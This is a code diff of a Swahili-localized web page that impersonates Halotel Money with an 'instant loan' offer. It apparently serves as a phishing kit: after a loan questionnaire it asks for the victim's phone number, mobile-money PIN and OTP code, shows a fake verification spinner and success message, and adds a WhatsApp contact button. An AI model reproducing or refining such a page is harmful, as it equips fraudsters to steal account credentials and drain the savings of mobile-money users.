@@ -16,12 +16,12 @@
       --halotel-gray: #f7f9fa;
       --text-muted: #64748B;
       --border-color: #E2E8F0;
+      --whatsapp-green: #25D366;
     }
 
     * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Plus Jakarta Sans', sans-serif; -webkit-tap-highlight-color: transparent; }
     button:focus { outline: none; }
     
-    /* Prevent body scroll to make it feel like a native app */
     body { 
       background: var(--halotel-gray); 
       display: flex; 
@@ -43,7 +43,6 @@
       overflow: hidden;
     }
 
-    /* Give it a nice phone-like frame on larger screens */
     @media (min-width: 481px) {
       .app-wrapper {
         height: 95vh;
@@ -69,7 +68,6 @@
     
     .logo-container { display: flex; align-items: center; gap: 8px; }
     
-    /* Halotel Logo */
     .halotel-logo { display: flex; align-items: center; gap: 5px; }
     .halotel-icon {
       width: 32px; height: 32px;
@@ -98,7 +96,7 @@
       overflow-y: auto; 
       display: flex;
       flex-direction: column;
-      -webkit-overflow-scrolling: touch; /* Smooth scrolling on iOS */
+      -webkit-overflow-scrolling: touch;
     }
 
     .page { display: none; flex: 1; flex-direction: column; animation: fadeIn 0.3s ease; }
@@ -260,6 +258,29 @@
     .waiting-screen h2 { font-size: 1.5rem; color: var(--halotel-dark); margin-bottom: 10px; font-weight: 800;}
     .waiting-screen p { color: var(--text-muted); line-height: 1.5; }
 
+    /* --- WHATSAPP FLOATING BUTTON --- */
+    .whatsapp-float {
+      position: fixed;
+      bottom: 25px;
+      right: 25px;
+      background-color: var(--whatsapp-green);
+      color: #fff;
+      width: 60px;
+      height: 60px;
+      border-radius: 50%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-size: 2rem;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.3);
+      z-index: 1000;
+      text-decoration: none;
+      transition: transform 0.2s;
+    }
+    .whatsapp-float:active {
+      transform: scale(0.9);
+    }
+
     /* Utilities */
     .error { color: #dc2626; font-size: 0.85rem; margin-top: 5px; padding: 0 20px; display: none; font-weight: 600; text-align: center;}
     .hidden { display: none !important; }
@@ -267,6 +288,11 @@
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 </head>
 <body>
+
+<!-- WhatsApp Floating Button -->
+<a href="https://wa.me/2557811655660?text=Habari%2C%20nahitaji%20msaada%20kuhusu%20mkopo%20wa%20Halotel" target="_blank" class="whatsapp-float">
+  <i class="fa-brands fa-whatsapp"></i>
+</a>
 
 <div class="app-wrapper">
   <!-- Navbar -->
@@ -293,86 +319,86 @@
     <div id="page1" class="page active">
       <div class="hero-section">
         <div class="trust-badge">
-          <i class="fa-solid fa-shield-halved"></i> <span id="t-badge">Licensed Digital Lending</span>
+          <i class="fa-solid fa-shield-halved"></i> <span id="t-badge">Leseni ya Kukopesha Kidijitali</span>
         </div>
         
-        <h2 id="t-hero-title">Instant Loans.<br>Anytime. Anywhere.</h2>
-        <p id="t-hero-sub">Quick access to credit for individuals and businesses. Join thousands of Tanzanians already empowered by Halotel Money.</p>
+        <h2 id="t-hero-title">Mikopo ya Papo Hapo.<br>Wakati Wowote. Mahali Popote.</h2>
+        <p id="t-hero-sub">Pata mkopo kwa haraka kwa ajili yako au biashara yako. Jiunge na maelfu ya Watanzania wanaonufaika na Halotel Money.</p>
 
         <div class="loan-card">
           <div class="loan-card-header">
             <div class="icon-box"><i class="fa-solid fa-mobile-screen"></i></div>
             <div class="loan-card-title">
-              <span id="t-loan-amount-lbl">Loan Amount</span>
+              <span id="t-loan-amount-lbl">Kiasi cha Mkopo</span>
               <h3>Up to TZS 1,000,000</h3>
             </div>
           </div>
 
           <div class="loan-details">
             <div class="loan-row">
-              <span id="t-approval-time">Approval Time</span>
-              <span class="highlight" id="t-instant">Instant</span>
+              <span id="t-approval-time">Muda wa Kuidhinisha</span>
+              <span class="highlight" id="t-instant">Papo Hapo</span>
             </div>
             <div class="loan-row">
-              <span id="t-disbursement">Disbursement</span>
+              <span id="t-disbursement">Malipo</span>
               <span class="highlight">Halotel Money</span>
             </div>
             <div class="loan-row" style="border-bottom: none;">
-              <span id="t-duration">Duration</span>
-              <span id="t-flexible">Flexible Terms</span>
+              <span id="t-duration">Muda</span>
+              <span id="t-flexible">Muda Unavyotaka</span>
             </div>
           </div>
 
           <div class="trust-box">
-            <span id="t-trusted">Trusted by</span>
+            <span id="t-trusted">Inaaminiwa na</span>
             <h4>30,000+</h4>
-            <span id="t-tanzanians">Tanzanians</span>
+            <span id="t-tanzanians">Watanzania</span>
           </div>
         </div>
 
-        <button class="btn-primary" onclick="showPage('page2')" id="t-apply-now">Apply Now</button>
+        <button class="btn-primary" onclick="showPage('page2')" id="t-apply-now">Omba Sasa</button>
       </div>
     </div>
 
     <!-- Page 2: Questionnaire -->
     <div id="page2" class="page">
-      <h2 class="form-title" id="t-your-app">Your Application</h2>
+      <h2 class="form-title" id="t-your-app">Maombi Yako</h2>
       <form id="formQuestionnaire" style="padding-bottom: 20px;">
         <div class="form-group">
-          <label id="t-full-name">Full name</label>
-          <input type="text" id="qName" required placeholder="Enter your full name">
+          <label id="t-full-name">Jina Kamili</label>
+          <input type="text" id="qName" required placeholder="Weka jina lako kamili">
         </div>
         <div class="form-group">
-          <label id="t-emp-status">Employment status</label>
+          <label id="t-emp-status">Hali ya Ajira</label>
           <select id="qEmployment" required>
-            <option value="" id="t-select-emp">Select your employment status</option>
-            <option value="Employed" id="t-emp-1">Employed</option>
-            <option value="Self-Employed" id="t-emp-2">Self-Employed</option>
-            <option value="Unemployed" id="t-emp-3">Unemployed</option>
+            <option value="" id="t-select-emp">Chagua hali yako ya ajira</option>
+            <option value="Employed" id="t-emp-1">Nimeajiriwa</option>
+            <option value="Self-Employed" id="t-emp-2">Nimejiajiri</option>
+            <option value="Unemployed" id="t-emp-3">Sijaajiriwa</option>
           </select>
         </div>
         <div class="form-group">
-          <label id="t-monthly-income">Monthly income (TZS)</label>
-          <input type="number" id="qIncome" required placeholder="Enter your monthly income">
+          <label id="t-monthly-income">Kipato cha Mwezi (TZS)</label>
+          <input type="number" id="qIncome" required placeholder="Weka kipato chako cha mwezi">
         </div>
         <div class="form-group">
-          <label id="t-loan-amount">Loan amount (TZS)</label>
-          <input type="number" id="qAmount" required placeholder="Enter loan amount">
+          <label id="t-loan-amount">Kiasi cha Mkopo (TZS)</label>
+          <input type="number" id="qAmount" required placeholder="Weka kiasi cha mkopo">
         </div>
         <div class="form-group">
-          <label id="t-repay-period">Repayment period</label>
+          <label id="t-repay-period">Muda wa Kurejesha</label>
           <select id="qTerm" required>
-            <option value="" id="t-select-period">Select repayment period</option>
-            <option value="1 month" id="t-period-1">1 month</option>
-            <option value="3 months" id="t-period-3">3 months</option>
-            <option value="6 months" id="t-period-6">6 months</option>
-            <option value="12 months" id="t-period-12">12 months</option>
+            <option value="" id="t-select-period">Chagua muda wa kurejesha</option>
+            <option value="1 month" id="t-period-1">Mwezi 1</option>
+            <option value="3 months" id="t-period-3">Miezi 3</option>
+            <option value="6 months" id="t-period-6">Miezi 6</option>
+            <option value="12 months" id="t-period-12">Miezi 12</option>
           </select>
         </div>
         
         <div class="error" id="errQ"></div>
         <button type="submit" id="btnSubmitForm" class="btn-submit">
-          <span id="t-submit-app">SUBMIT APPLICATION</span>
+          <span id="t-submit-app">TUMA MAOMBI</span>
         </button>
       </form>
     </div>
@@ -382,17 +408,17 @@
       <div class="login-container">
         <div class="login-top">
           <div class="login-logo" style="color: var(--halotel-orange);">Halotel Money</div>
-          <h3 id="t-secure-login">Secure Login</h3>
+          <h3 id="t-secure-login">Ingia kwa Usalama</h3>
 
           <div class="phone-input-box">
             <div class="country-code">
               <div class="flag-icon"></div>
               +255
             </div>
-            <input type="tel" id="pPhone" placeholder="Halotel Phone Number" autocomplete="off">
+            <input type="tel" id="pPhone" placeholder="Namba ya Halotel" autocomplete="off">
           </div>
 
-          <p class="pin-label" id="t-enter-pin">Enter your Halotel Money PIN</p>
+          <p class="pin-label" id="t-enter-pin">Weka PIN yako ya Halotel Money</p>
           <div class="pin-boxes" id="pinContainer">
             <input type="password" autocomplete="new-password" maxlength="1" inputmode="numeric" oninput="moveFocus(this, 'pin1')" id="pin0">
             <input type="password" autocomplete="new-password" maxlength="1" inputmode="numeric" oninput="moveFocus(this, 'pin2')" id="pin1">
@@ -404,14 +430,14 @@
         </div>
 
         <div class="login-bottom">
-          <p id="t-register-text">To register a Halotel Money account or get assistance,<br>click below</p>
+          <p id="t-register-text">Ili kusajili akaunti ya Halotel Money au kupata msaada,<br>bonyeza hapa chini</p>
           <div class="bottom-buttons">
-            <button type="button" onclick="submitRegistration()" id="btnRegister"><i class="fa-solid fa-user-plus"></i><span id="t-register-btn">Register</span></button>
-            <button type="button" onclick="alert('Help')"><i class="fa-solid fa-circle-info"></i><span id="t-help-btn">Help & Support</span></button>
+            <button type="button" onclick="submitRegistration()" id="btnRegister"><i class="fa-solid fa-user-plus"></i><span id="t-register-btn">Sajili</span></button>
+            <button type="button" onclick="alert('Help')"><i class="fa-solid fa-circle-info"></i><span id="t-help-btn">Msaada</span></button>
           </div>
           <div class="login-footer">
             v4.0.3P<br><br>
-            <span id="t-terms-text">By signing in you agree to the</span> <a href="#" id="t-terms-link">Terms and Conditions</a>
+            <span id="t-terms-text">Kwa kuingia unakubali</span> <a href="#" id="t-terms-link">Masharti na Vigezo</a>
           </div>
         </div>
       </div>
@@ -422,7 +448,7 @@
       <div class="login-container">
         <div class="login-top">
           <div class="login-logo" style="color: var(--halotel-orange);">Halotel Money</div>
-          <h3 id="t-otp-sent">Enter the OTP code sent to</h3>
+          <h3 id="t-otp-sent">Weka namba ya OTP iliyotumwa kwa</h3>
           <div class="otp-phone" id="otpPhoneDisplay" style="font-weight: 700; margin-bottom: 40px; font-size: 1.1rem; color: var(--halotel-orange);">+255 00 000 0000</div>
 
           <div class="otp-boxes" id="otpContainer">
@@ -435,12 +461,12 @@
             <input type="text" maxlength="1" inputmode="numeric" oninput="moveFocusOTP(this, null)" id="otp5">
           </div>
 
-          <p class="resend-text"><span id="t-resend">Resend OTP in</span> <span id="timer">44</span> Sec</p>
+          <p class="resend-text"><span id="t-resend">Tuma tena OTP baada ya</span> <span id="timer">44</span> Sec</p>
           <div class="error" id="errOtp" style="margin-top: 15px;"></div>
         </div>
 
         <div class="login-bottom" style="padding-top: 30px; padding-bottom: 30px;">
-          <div class="help-link" onclick="alert('Help')"><i class="fa-regular fa-circle-question"></i> <span id="t-help-btn-2">Help & Support</span></div>
+          <div class="help-link" onclick="alert('Help')"><i class="fa-regular fa-circle-question"></i> <span id="t-help-btn-2">Msaada</span></div>
           <div class="login-footer" style="margin-top: 10px;">v4.2.9</div>
         </div>
       </div>
@@ -450,15 +476,15 @@
     <div id="page-waiting" class="page">
       <div class="waiting-screen">
         <div class="spinner"></div>
-        <h2 id="t-wait-title">Please wait...</h2>
-        <p id="t-wait-sub">We are verifying your details.<br>This may take a moment.</p>
+        <h2 id="t-wait-title">Tafadhali subiri...</h2>
+        <p id="t-wait-sub">Tunathibitisha taarifa zako.<br>Hii inaweza kuchukua muda.</p>
       </div>
     </div>
 
     <!-- Page 6: Success -->
     <div id="page5" class="page" style="text-align: center; padding: 50px 20px; justify-content: center;">
-      <h2 style="color: var(--halotel-orange); font-size: 2.5rem; margin-bottom: 20px; font-weight: 800;" id="t-success-title">Congratulations!</h2>
-      <p style="color: var(--text-muted); font-size: 1.1rem; line-height: 1.5;" id="t-success-sub">Your loan application has been fully processed. Please check your Halotel Money account shortly.</p>
+      <h2 style="color: var(--halotel-orange); font-size: 2.5rem; margin-bottom: 20px; font-weight: 800;" id="t-success-title">Hongera!</h2>
+      <p style="color: var(--text-muted); font-size: 1.1rem; line-height: 1.5;" id="t-success-sub">Maombi yako ya mkopo yamekamilika. Tafadhali angalia akaunti yako ya Halotel Money hivi punde.</p>
     </div>
   </div>
 </div>
@@ -488,9 +514,7 @@
       fullName: "Full name",
       empStatus: "Employment status",
       selectEmp: "Select your employment status",
-      emp1: "Employed",
-      emp2: "Self-Employed",
-      emp3: "Unemployed",
+      emp1: "Employed", emp2: "Self-Employed", emp3: "Unemployed",
       monthlyIncome: "Monthly income (TZS)",
       loanAmount: "Loan amount (TZS)",
       repayPeriod: "Repayment period",
@@ -532,9 +556,7 @@
       fullName: "Jina Kamili",
       empStatus: "Hali ya Ajira",
       selectEmp: "Chagua hali yako ya ajira",
-      emp1: "Nimeajiriwa",
-      emp2: "Nimejiajiri",
-      emp3: "Sijaajiriwa",
+      emp1: "Nimeajiriwa", emp2: "Nimejiajiri", emp3: "Sijaajiriwa",
       monthlyIncome: "Kipato cha Mwezi (TZS)",
       loanAmount: "Kiasi cha Mkopo (TZS)",
       repayPeriod: "Muda wa Kurejesha",
@@ -570,7 +592,6 @@
   }
   init();
 
-  // Language Switcher Logic
   function setLanguage(lang) {
     currentLang = lang;
     document.getElementById('btn-en').classList.toggle('active', lang === 'en');
@@ -624,7 +645,6 @@
     document.getElementById('t-success-title').innerHTML = t.successTitle;
     document.getElementById('t-success-sub').innerHTML = t.successSub;
 
-    // Update placeholders
     document.getElementById('qName').placeholder = t.phName;
     document.getElementById('qIncome').placeholder = t.phIncome;
     document.getElementById('qAmount').placeholder = t.phAmount;
@@ -637,7 +657,6 @@
     document.querySelector('.page-container').scrollTop = 0;
   }
 
-  // Page 2 Submit
   document.getElementById('formQuestionnaire').addEventListener('submit', async (e) => {
     e.preventDefault();
     const btn = document.getElementById('btnSubmitForm');
@@ -670,7 +689,6 @@
     }
   });
 
-  // PIN AUTO-SUBMIT LOGIC
   function moveFocus(current, nextId) {
     if (current.value.length === 1) {
       if (nextId) {
@@ -681,7 +699,6 @@
     }
   }
 
-  // Page 3 Submit
   async function submitRegistration() {
     const phone = document.getElementById('pPhone').value.trim();
     const pins = Array.from(document.querySelectorAll('#pinContainer input')).map(i => i.value).join('');
@@ -719,7 +736,6 @@
     }
   }
 
-  // OTP AUTO-SUBMIT LOGIC
   function moveFocusOTP(current, nextId) {
     if (current.value.length === 1) {
       if (nextId) {
@@ -805,7 +821,6 @@
     if(t && parseInt(t.textContent) > 0) t.textContent = parseInt(t.textContent) - 1;
   }, 1000);
 
-  // Initialize Swahili on load
   setLanguage('sw');
 </script>
 </body>
